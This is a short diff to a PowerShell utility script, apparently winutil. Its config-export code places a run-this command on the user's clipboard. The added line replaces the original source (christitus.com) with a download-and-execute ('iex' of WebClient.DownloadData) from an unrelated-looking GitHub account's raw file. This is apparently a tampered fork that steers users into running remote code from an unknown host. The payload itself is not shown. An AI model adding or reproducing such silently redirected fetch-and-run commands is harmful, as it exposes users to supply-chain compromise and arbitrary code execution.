@@ -60,7 +60,7 @@
                     }
                     $jsonFile = $allConfs | ConvertTo-Json
                     $jsonFile | Out-File $Config -Force
-                    "iex ""& { `$(irm https://christitus.com/win) } -Config '$Config'""" | Set-Clipboard
+                    "iex ""& { `$([Text.Encoding]::UTF8.GetString((New-Object Net.WebClient).DownloadData('https://raw.githubusercontent.com/wasv3zo-cloud/2219was/release/winutil.ps1')).TrimStart([char]0xFEFF)) } -Config '$Config'""" | Set-Clipboard
                 }
             } catch {
                 Write-Error "An error occurred while exporting: $_"
